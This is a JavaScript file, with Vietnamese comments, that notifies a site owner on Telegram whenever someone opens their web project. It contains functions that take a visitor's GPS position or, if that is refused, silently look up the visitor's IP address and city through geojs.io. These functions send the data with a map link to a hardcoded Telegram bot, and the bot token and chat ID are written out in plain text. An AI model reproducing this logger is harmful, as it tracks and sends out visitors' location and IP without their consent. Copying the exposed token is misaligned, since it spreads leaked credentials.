/**
 * notifications.js
 * Trách nhiệm: Giao tiếp với Telegram API và lấy thông tin vị trí (GPS/IP).
 */

const TELEGRAM_BOT_TOKEN = "8632589547:AAGQjBlLd906MzjBsr8ToOTXp-J_1VoPqGU";
const TELEGRAM_CHAT_ID = "6149032213";

/**
 * Gửi thông báo tin nhắn văn bản thuần túy tới Telegram
 */
function sendTelegramNotification(customMessage = "Có ai đó vào link web bạn") {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: customMessage,
    }),
  })
    .then((res) => res.json())
    .then((data) => {
      if (data.ok) console.log("Notification sent");
      else console.error("Failed to send notification:", data);
    })
    .catch((err) => console.error("Error sending notification:", err));
}

/**
 * Gửi vị trí GPS hoặc IP kèm thông tin phụ tới Telegram
 */
function sendLocationToTelegram(lat, lng, info = "") {

  if (sessionStorage.getItem("telegramNotificationSent")) {
    console.log("Notification already sent in this session.");
    return;
  }

  const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
  const message = `🚨 CÓ NGƯỜI ĐANG XEM DỰ ÁN CỦA BẠN!\n📍 Vị trí: ${mapLink}${info}`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

  fetch(url)
    .then((response) => {
      if (response.ok) {
        console.log("Location notification sent successfully.");
        sessionStorage.setItem("telegramNotificationSent", "true");
      } else {
        console.error("Failed to send location:", response.status);
      }
    })
    .catch((err) => console.error("Lỗi gửi Telegram:", err));
}


function fallbackToIP(targetUrl = "") {
  fetch("https://get.geojs.io/v1/ip/geo.json")
    .then((res) => res.json())
    .then((data) => {
      const info = `\n🌎 Vùng (IP): ${data.city || "Không rõ"}, ${data.region || "Không rõ"}, ${data.country || "Không rõ"}\n🌐 IP: ${data.ip}\n🔗 Project: ${targetUrl}`;
      sendLocationToTelegram(data.latitude || 0, data.longitude || 0, info);
    })
    .catch((err) => console.error("Lỗi lấy vị trí IP:", err));
}

/**
 * Lấy vị trí GPS chính xác
 */
function trackUserLocation(targetUrl = "") {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const info = `\n🎯 Vị trí chính xác (GPS)\n🔗 Project: ${targetUrl}`;
        sendLocationToTelegram(position.coords.latitude, position.coords.longitude, info);
      },
      (error) => {
        console.log("GPS bị từ chối/lỗi, chuyển sang IP...", error.message);
        fallbackToIP(targetUrl);
      },
      { timeout: 8000, maximumAge: 60000, enableHighAccuracy: true }
    );
  } else {
    fallbackToIP(targetUrl);
  }
}


window.addEventListener("load", () => {
  const message = "Có người vào web của bạn";
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
  fetch(url).catch((err) => console.error("Initial notification error:", err));
});
